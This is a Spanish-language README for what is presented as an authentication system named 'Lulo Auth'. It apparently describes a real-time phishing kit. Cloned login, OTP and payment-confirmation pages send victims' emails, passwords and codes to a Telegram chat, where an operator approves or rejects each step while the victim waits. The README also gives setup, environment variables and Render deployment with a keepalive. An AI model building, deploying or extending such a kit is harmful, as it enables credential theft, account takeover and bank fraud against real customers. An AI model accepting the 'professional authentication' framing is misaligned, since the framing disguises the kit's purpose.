# Lulo Auth System - Polling Automático con Telegram

## 📋 Descripción

Sistema profesional de autenticación con polling automático (sin webhook) que integra Telegram para validación de credenciales. Incluye 3 flujos:

1. **Login**: Validación de email + contraseña
2. **Registro OTP**: Verificación de código OTP
3. **Confirmación**: Finalización del flujo de pago

## 🎯 Características

✅ Polling automático cada 2 segundos (configurable)  
✅ Shadow loader integrado  
✅ Modal de error con desaparición automática en 4 segundos  
✅ Botones deshabilitados hasta completar campos  
✅ Validación en frontend + backend  
✅ Integración Telegram Bot API  
✅ Session management con TTL  
✅ SetInterval keepalive para Render  
✅ Estilos intactos (no modificados)  
✅ Código modular y mantenible  

## 🚀 Setup Local

### Backend

```bash
cd server
npm install
npm start
```

El servidor inicia en `http://localhost:3000`

### Variables de Entorno (.env)

```env
NODE_ENV=development
PORT=3000
API_URL=http://localhost:3000
TELEGRAM_BOT_TOKEN=tu_token
TELEGRAM_CHAT_ID=tu_chat_id
REDIS_URL=redis://localhost:6379
SESSION_TTL=300000
POLLING_INTERVAL=2000
CORS_ORIGIN=*
```

### Frontend

Abre los archivos HTML en tu navegador:
- `login_clean.html` - Página de login
- `registrationOTP_clean.html` - Verificación OTP
- `confirmation_clean.html` - Confirmación de pago

## 📁 Estructura

```
proyectmeluuu/
├── server/                          # Backend Node.js
│   ├── server.js                    # App principal
│   ├── config.js                    # Configuración
│   ├── package.json
│   ├── .env                         # Variables de entorno
│   ├── routes/                      # Rutas API
│   ├── services/                    # Servicios (Telegram, Sessions)
│   └── middleware/                  # Validaciones
│
├── login_clean.html                 # Frontend login
├── registrationOTP_clean.html       # Frontend OTP
├── confirmation_clean.html          # Frontend confirmación
├── pollingClient.js                 # Cliente de polling
├── shadowLoader.js                  # Componente loader
├── modalError.js                    # Componente modal error
├── styles.css                       # Estilos (INTACTOS)
└── README.md
```

## 🔄 Flujo de Datos

### Login → OTP → Confirmación

```
1. Usuario completa email + contraseña
   ↓
2. Frontend: validación local
   ↓
3. POST /api/auth/login
   ↓
4. Backend: crea sesión, envía a Telegram
   ↓
5. Frontend: muestra loader, inicia polling cada 2s
   ↓
6. GET /api/auth/status/:sessionId (polling)
   ↓
7. Usuario responde en Telegram: "RegistroOtp✅" o "ERROR❌"
   ↓
8. Backend actualiza sesión con respuesta
   ↓
9. Frontend detecta respuesta, redirige o muestra error
```

## 🤖 Integración Telegram

El bot envía mensajes formateados con:
- Session ID
- Datos del usuario
- Opciones de respuesta

Usuario responde con botones:
- ✅ RegistroOtp / Aprobado
- ❌ ERROR

## 🔐 Seguridad

- Validación en frontend + backend
- Session TTL (5 minutos default)
- Cleanup automático de sesiones expiradas
- No almacena credenciales sensibles
- CORS configurado
- Logging de operaciones

## 🌐 Deploy en Render

1. Crear repositorio en GitHub
2. Push código
3. Crear nueva aplicación en Render
4. Conectar repositorio
5. Configurar variables de entorno
6. Deploy automático

El servidor incluye **setInterval keepalive** que impide suspensión en Render.

## 📊 Endpoints API

### Auth
- `POST /api/auth/login` - Iniciar login
- `GET /api/auth/status/:sessionId` - Estado de login

### OTP
- `POST /api/otp/verify` - Verificar código OTP
- `GET /api/otp/status/:sessionId` - Estado de OTP

### Confirmation
- `POST /api/confirmation/confirm` - Confirmar pago
- `GET /api/confirmation/status/:sessionId` - Estado

### Health
- `GET /api/health` - Estado del servidor

## 🧪 Testing

1. Abre `login_clean.html`
2. Completa email (ej: test@example.com)
3. Completa contraseña (≥4 caracteres)
4. Haz clic "Ingresar"
5. Verás loader + polling automático
6. En Telegram, responde con ✅ o ❌

## 📝 Logs

Server loga:
- `[SERVER]` - Inicio
- `[KEEPALIVE]` - Check cada 25 minutos
- `[SESSION]` - CRUD de sesiones
- `[TELEGRAM]` - Mensajes enviados
- `[POLLING]` - Requests de polling
- `[ERROR]` - Errores

## 🤝 Soporte

Para issues o mejoras, revisa:
- `PLAN_IMPLEMENTACION.md` - Plan detallado
- Console del navegador - Logs del cliente
- Logs del servidor - Eventos del backend

---

**Versión**: 1.0.0  
**Licencia**: Privada  
**Última actualización**: 2026-04-17
